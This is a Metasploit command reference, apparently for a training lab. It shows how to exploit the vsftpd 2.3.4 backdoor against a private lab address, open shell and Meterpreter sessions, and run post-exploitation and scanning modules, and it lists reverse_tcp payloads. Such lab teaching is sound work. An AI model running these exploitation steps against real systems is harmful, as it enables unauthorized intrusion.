# Metasploit Reference Guide

## Launch Metasploit

```bash
msfconsole
```

---

# Workspace Management

## Create Workspace

```bash
workspace -a ncsa-labs
```

## View Workspaces

```bash
workspace
```

---

# Search Modules

## Search by Service

```bash
search vsftpd
```

## Search by Platform

```bash
search type:exploit platform:linux
```

---

# Select Exploit Module

## Use Module

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

---

# View Module Options

## Display Settings

```bash
show options
```

## View Payloads

```bash
show payloads
```

---

# Configure Exploit

## Set Target IP

```bash
set RHOSTS 10.0.2.4
```

## Set Local IP

```bash
set LHOST 10.0.2.3
```

## Set Payload

```bash
set PAYLOAD cmd/unix/interact
```

---

# Launch Exploit

## Run Exploit

```bash
run
```

Alternative:

```bash
exploit
```

---

# Session Management

## View Sessions

```bash
sessions
```

## Interact with Session

```bash
sessions -i 1
```

## Background Session

```bash
background
```

---

# Meterpreter Commands

## System Information

```bash
sysinfo
```

## Current User

```bash
getuid
```

## List Processes

```bash
ps
```

## Open Shell

```bash
shell
```

---

# Auxiliary Modules

## SMB Version Scanner

```bash
use auxiliary/scanner/smb/smb_version
```

## Port Scanner

```bash
use auxiliary/scanner/portscan/tcp
```

---

# Common Payloads

| Payload | Purpose |
|---|---|
| cmd/unix/interact | Linux shell |
| windows/meterpreter/reverse_tcp | Windows Meterpreter |
| linux/x86/meterpreter/reverse_tcp | Linux Meterpreter |

---

# Common Commands

| Command | Purpose |
|---|---|
| search | Search modules |
| use | Select module |
| set | Configure variables |
| show options | Display parameters |
| run | Execute module |
| sessions | Manage sessions |

---

# Common Troubleshooting

## No Session Created

### Check:
- target connectivity
- firewall settings
- payload configuration
- `LHOST` settings

---

## Exploit Fails

### Verify:
- target vulnerability
- service version
- exploit compatibility

---

## Invalid Payload

### Resolution

Use:

```bash
show payloads
```

---

# Useful Notes

- Accurate enumeration improves exploitation success.
- Payload compatibility depends on operating system architecture.
- Meterpreter provides advanced post-exploitation functionality.
- Some exploits require specific service versions.

---

# Related Labs

- Metasploit to Metasploitable2
- Vulnerability Exploitation
- Post-Exploitation Enumeration
- Meterpreter Usage
- Service Enumeration